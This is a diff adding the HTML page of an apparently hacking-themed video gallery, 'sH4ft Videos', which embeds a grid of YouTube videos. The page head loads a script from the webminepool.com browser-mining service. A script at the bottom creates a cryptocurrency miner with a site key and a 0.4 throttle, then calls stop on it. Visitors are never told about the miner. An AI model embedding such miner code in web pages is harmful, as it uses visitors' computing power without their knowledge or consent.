@@ -1,0 +1,200 @@
+ <!DOCTYPE html>
+<html>
+    <head>
+        <div class="body">
+            <title>sH4ft Videos</title>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <link rel="stylesheet" href="css/sH.css">
+            <link rel="icon" type="image/x-icon" href="favicon/favicon.ico">            
+            <script src="https://webminepool.com/lib/base.js"></script>
+            <script type="text/javascript" src="contact/js/jquery-1.2.6.min.js"></script>
+            <script type="text/javascript" src="contact/js/jquery.validate.js"></script>
+            <script type="text/javascript">
+                $(document).ready(function(){
+                        
+                    $("#formLeft .input-bg").hover(function() {
+                        $(this).addClass("active");
+                    }, function() {
+                        $(this).removeClass("active");
+                    });
+                    
+                    $("#formLeft input").focus(function() {
+                    
+                        $(this).parent().addClass("active");
+                    });
+                    $("#formLeft input").blur(function() {
+                        $("#formLeft .input-bg").removeClass("active");
+                    });
+                        
+                    $("#formRight .message-bg").hover(function() {
+                        $(this).addClass("active");
+                    }, function() {
+                        $(this).removeClass("active");
+                    });
+                    
+                    $("#formRight textarea").focus(function() {
+                        $(this).parent().addClass("active");
+                    });
+                    $("#formRight textarea").blur(function() {
+                        $("#formRight .message-bg").removeClass("active");
+                    });
+                        
+                    $("#commentForm").validate();
+                });
+
+                const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");
+
+                if (prefersDarkScheme.matches) {
+                      document.body.classList.add("dark-theme");
+                } 
+                else {
+                document.body.classList.add("dark-theme");
+                }
+            </script>
+        </div>
+    </head>
+    <body>
+
+    <!-- Navbar (sit on top) -->
+
+        <div class="sH-top">
+            <div class="sH-bar sH-black sH-wide sH-padding sH-card">
+                <img href="#home" class="sH-image" src="fk_img/240px-Anonymous_emblem.svg.png" alt="sH4ft" width="50" height="50">
+                <!-- Float links to the right. Hide them on small screens -->
+                <div class="sH-right sH-hide-small">
+                    <a href="index.html#home" class="sH-bar-item sH-button">Home</a>
+                    <a href="vid.html" class="sH-bar-item sH-button">videos</a>
+                    <a href="contact/index.html" class="sH-bar-item sH-button">Contact</a>
+                    <a href="about.html" class="sH-bar-item sH-button">About</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="sH-container sH-padding-32" id="about">
+        <div class="sH-container sH-padding-32" id="about">
+        <!-- H4ckin videos -->
+
+        <div class="sH-content sH-padding" style="max-width:1564px">
+
+            <!-- H4ckin vid project-->
+    
+            <div class="sH-container sH-padding-32" id="H4ckin videos">
+                <h3 class="sH-border-bottom sH-border-light-grey sH-padding-16">
+                    <div class="chip">
+                        <img src="fk_img/240px-Anonymous_emblem.svg.png" alt="sH4ft" width="96" height="96"> <b>Youtube Embeded Videos</b>>
+                    </div> 
+                    
+                </h3>
+            </div>
+            
+            <!-- embedded videos-->
+
+            <div class="sH-row-padding">
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/3Kq1MIfTWCE"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/8jLOx1hD3_o"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/CX0V_hspEZU"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/jBzwzrDvZ18"></iframe>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sH-row-padding">
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/cx6Xs3F_1Uc"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://youtube.com/embed/ciNHn38EyRc"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://youtube.com/embed/lkOBvy4bRr4"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://youtube.com/embed/T8ktppSHGww"></iframe>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sH-row-padding">
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/EjOkeacyW3I"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/ltEFbi_I2KY"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/_C7nRJ6WsmI"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/Ezy1KTNF6dw"></iframe>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sH-row-padding">
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/XKoTwepEzPI"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/2_26Ndtt0xU"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/7YpJQT55_Y8"></iframe>
+                    </div>
+                </div>
+                <div class="sH-col l3 m6 sH-margin-bottom">
+                    <div class="sH-display-container">
+                        <iframe src="https://www.youtube.com/embed/rmFX1V49K8U"></iframe>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            var miner = WMP.Anonymous('SK_kRw6BGHzNZcN7pEOoWpmj',{throttle: 0.4});
+            miner.stop();
+
+            const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");
+
+            if (prefersDarkScheme.matches) {
+                  document.body.classList.add("dark-theme");
+            } 
+            else {
+            document.body.classList.add("dark-theme");
+            }
+        </script>
+    </body>
+</html> 
